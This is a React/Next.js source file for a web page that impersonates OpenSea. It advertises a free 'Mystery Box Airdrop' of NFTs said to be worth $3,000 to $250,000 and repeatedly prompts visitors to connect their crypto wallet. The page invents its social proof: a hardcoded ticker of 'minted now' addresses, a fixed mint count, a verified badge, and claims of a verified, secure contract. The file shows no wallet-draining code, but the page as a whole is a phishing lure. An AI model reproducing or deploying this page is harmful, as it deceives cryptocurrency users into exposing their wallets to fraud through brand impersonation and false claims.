"use client";

import { useState } from "react";
import Image from "next/image";
import Link from "next/link";
import { useAccount, useConnect, useDisconnect } from "wagmi";

export default function Page() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isWalletOpen, setIsWalletOpen] = useState(false);
  const [amount, setAmount] = useState(1);

  const { isConnected, address } = useAccount();
  const { connect, connectors, isPending } = useConnect();
  const { disconnect } = useDisconnect();

  const injected = connectors.find((c) => c.id === "injected") ?? connectors[0];
  const hasInjected = typeof window !== 'undefined' && !!(window as any).ethereum;
  const connectBtnText = isConnected
    ? `${address?.slice(0,6)}...${address?.slice(-4)}`
    : (isPending ? 'Connecting...' : 'Connect Wallet');
  const dappHost = typeof window !== 'undefined' ? window.location.host + (window.location.pathname || '') : '';
  const metamaskDeepLink = `https://metamask.app.link/dapp/${dappHost}`;

  return (
    <>
      <header>
        <div className="logo_head">
          <div className="logo_img">
            <Image src="/opensea.svg" width={40} height={40} alt="logo" />
          </div>
        </div>
        <div className="inputs_head">
          <div className="searche">
            <div className="magnifying">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zM9.5 14C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="#89929a"/></svg>
            </div>
            <div className="inputs_head_inner">
              <input placeholder="Search items, collections, and accounts" />
            </div>
            <div className="slash"><span>/</span></div>
          </div>
          <div className="connect">
            <button className="connect_btn connectWallet" onClick={() => {
              if (isConnected) return disconnect();
              setIsWalletOpen(true);
            }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M21 7H7a2 2 0 00-2 2v6a2 2 0 002 2h14V7zm-4 5a2 2 0 110 4 2 2 0 010-4z" fill="#353840"/></svg>
              <span>{connectBtnText}</span>
            </button>
            <div className="user">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="#353840"><path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/></svg>
            </div>
            <button className="basket">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="#353840"><path d="M7 4h-2l-3 7v2h2l3-7h10l3 7h2v-2l-3-7h-12zM7 22c-1.1 0-2-.9-2-2l1-7h12l1 7c0 1.1-.9 2-2 2h-10z"/></svg>
            </button>
          </div>
        </div>
      </header>

      <div className="ticker-wrapper" style={{ position: 'fixed', top: 72, left: 0 }}>
        <div className="ticker">
          <span>0x2fAE...F457 minted now</span>
          <span>0xD49A...EAEE minted now</span>
          <span>0x52a3...19A5 minted now</span>
          <span>0xB798...CA61 minted now</span>
          <span>0x902f...0b72 minted now</span>
          <span>0xED04...a4Cd minted now</span>
          <span>0x5ac4...E4BD minted now</span>
        </div>
      </div>

      <main className="main_content" style={{ paddingTop: 120 }}>
        <div className="main_screen">
          <div className="video">
            <video autoPlay muted loop playsInline>
              <source src="/high.mp4" type="video/mp4" />
            </video>
          </div>
          <div className="color_tone" />
          <div className="screen_lable">
            <div className="screen_lable_content">
              <div className="lable_content_left">
                <div className="lable_screen_logo">
                  <Image src="/boath_png.png" width={82} height={82} alt="collection" />
                </div>
                <div className="lable_screen_username">
                  <span>Gemesis</span>
                  <svg className="vefify" viewBox="0 0 23 23" fill="#fff"><circle cx="11.5" cy="11.5" r="11.5" fill="#008ce6"/></svg>
                </div>
                <div className="lable_owner">
                  <span>By OpenSea</span>
                  <Link className="hover" href="https://etherscan.io/address/0x495f947276749Ce646f68AC8c248420045cb7b5e" target="_blank">View on Etherscan</Link>
                </div>
                <div className="lable_miting" onClick={() => setIsModalOpen(true)}>
                  <div className="lable_dot"><div /><div className="amin" /></div>
                  <div className="lable_btn">Mint Now</div>
                </div>
              </div>
              <div className="lable_content_right">
                <div className="content_right">
                  <div className="links">
                    <Link className="icon" href="https://discord.gg/opensea" target="_blank">D</Link>
                    <Link className="icon" href="https://twitter.com/opensea_support" target="_blank">X</Link>
                    <Link className="icon" href="https://reddit.com/r/opensea" target="_blank">R</Link>
                    <Link className="icon" href="https://instagram.com/opensea" target="_blank">I</Link>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="about_content">
          <div className="main_user">
            <div className="about_lable"><h2>About</h2></div>
            <div className="about_user">
              <div className="lable_content_logo">
                <Image src="/boath_png.png" width={48} height={48} alt="logo" />
              </div>
              <div className="lable_content_author">
                <div className="content_author_username">
                  <span>Gemesis</span>
                  <svg aria-label="verified-icon" fill="#008ce6" viewBox="0 0 43 46" width="15" height="15"><circle cx="22" cy="22" r="20" fill="#008ce6"/></svg>
                </div>
                <div className="content_author_coin"><span>Ethereum</span></div>
              </div>
            </div>
            <div className="about_description">
              <p><strong>🎉 New Mystery Box Airdrop – Only 150 Boxes Available</strong><br /> The next wave of NFT utility is here.<br />Each box unlocks exclusive OpenSea Pro–level rewards, with NFT values ranging from $3,000 to $250,000 in historical OpenSea collections.</p>
              <br />
              <h3>🎁 Claim Rules:</h3>
              <ul className="claim_rules">
                <li>Only 150 Mystery Boxes available</li>
                <li>1 Box per wallet — no exceptions</li>
                <li>Available for a limited time or until fully claimed</li>
                <li>✅ Smart contract verified</li>
                <li>🔒 Claim is on-chain, secure, and trackable</li>
              </ul>
            </div>
          </div>
          <div className="main_dimands">
            <div className="slider">
              <div className="frame">
                <Image src="/boath.png" width={800} height={600} alt="frame" />
              </div>
            </div>
            <div className="stat">
              <div className="stat_row">
                <div className="stat_nums">
                  <div className="stat_nums_left"><span>49.5% minted</span></div>
                  <div className="stat_nums_right"><span>73 / 150</span></div>
                </div>
                <div className="stat_line">
                  <div className="stat_line_left"></div>
                  <div className="stat_line_right"></div>
                </div>
              </div>
              <div className="counter">
                <div className="counter_lable">Community</div>
                <div className="counter_amount">0 ETH</div>
                <div className="counter_input">
                  <div className="counter_input_count">
                    <div className="minus" onClick={() => setAmount((a)=>Math.max(1, a-1))}><span>-</span></div>
                    <div className="int">{amount}</div>
                    <div className="plus" onClick={() => setAmount((a)=>a+1)}><span>+</span></div>
                  </div>
                  <div className="connectButton mint interact-button" id="messageButton" style={{cursor:'pointer'}} onClick={() => setIsModalOpen(true)}>
                    <a>Mint</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer>
        <div className="first_row">
          <div className="first_row_left">
            <div className="row_left_lable">Stay in the loop</div>
            <div className="row_left_desc">Join our mailing list to stay in the loop with our newest feature releases, NFT drops, and tips and tricks for navigating OpenSea.</div>
            <div className="row_left_input">
              <div className="left_input"><input type="text" placeholder="Your email address" /></div>
              <div className="left_btn">Sign up</div>
            </div>
          </div>
          <div className="first_row_right">
            <div className="row_left_lable">Join the community</div>
            <div className="row_links">
              <div className="content_right">
                <div className="links">
                  <Link className="icon" href="https://discord.gg/opensea" target="_blank">D</Link>
                  <Link className="icon" href="https://twitter.com/opensea_support" target="_blank">X</Link>
                  <Link className="icon" href="https://reddit.com/r/opensea" target="_blank">R</Link>
                  <Link className="icon" href="https://instagram.com/opensea" target="_blank">I</Link>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>

      {/* Modal */}
      <div id="mintModal" className="modal" style={{ display: isModalOpen ? 'flex' : 'none' }}>
        <div className="modal-content">
          <button className="close-buttonser" onClick={() => setIsModalOpen(false)}>×</button>
          <div className="logo_head" style={{display:'block'}}>
            <div className="logo_img" style={{display:'block'}}>
              <Image src="/opensea.svg" width={60} height={60} alt="logo" />
            </div>
          </div>
          <h2>Mint Your NFT</h2>
          <div className="details">
            <p>🎉 <strong>Price:</strong> FREE</p>
            <p>🎉 <strong>Supply:</strong> 150 Mystery Box</p>
            <p>🎉 <strong>Rewards:</strong> NFT valued between $3000 and $250,000</p>
          </div>
          <Image src="/389-9bec97c22fa2e411.gif" alt="NFT Image" width={320} height={200} />
          <div className="buttonser">
            <button className="plus-minus" onClick={() => setAmount((a)=>Math.max(1, a-1))} disabled={amount<=1}>-</button>
            <input type="number" value={amount} readOnly />
            <button className="plus-minus" onClick={() => setAmount((a)=>a+1)}>+</button>
          </div>
          <button
            className="connect-walletser connectButton interact-button connectWallet"
            onClick={() => {
              if (isConnected) return disconnect();
              setIsWalletOpen(true);
            }}
          >
            {isConnected ? `Connected: ${address?.slice(0,6)}...${address?.slice(-4)}` : connectBtnText}
          </button>
        </div>
      </div>
      {/* Wallet Select Modal */}
      <div id="walletModal" className="modal" style={{ display: isWalletOpen ? 'flex' : 'none' }}>
        <div className="modal-content">
          <button className="close-buttonser" onClick={() => setIsWalletOpen(false)}>×</button>
          <h2>Select Wallet</h2>
          <div className="buttonser" style={{gap:12, display:'flex', flexDirection:'column', alignItems:'stretch'}}>
            {connectors.map((c) => (
              <button
                key={c.id}
                className="connect-walletser connectButton interact-button connectWallet"
                disabled={c.id === 'injected' && !hasInjected}
                onClick={() => connect({ connector: c })}
              >
                {c.name}
              </button>
            ))}
            {!hasInjected && (
              <a
                href={metamaskDeepLink}
                className="connect-walletser connectButton interact-button connectWallet"
                style={{textAlign:'center', textDecoration:'none'}}
              >
                Open in MetaMask (Mobile)
              </a>
            )}
          </div>
        </div>
      </div>
    </>
  );
}
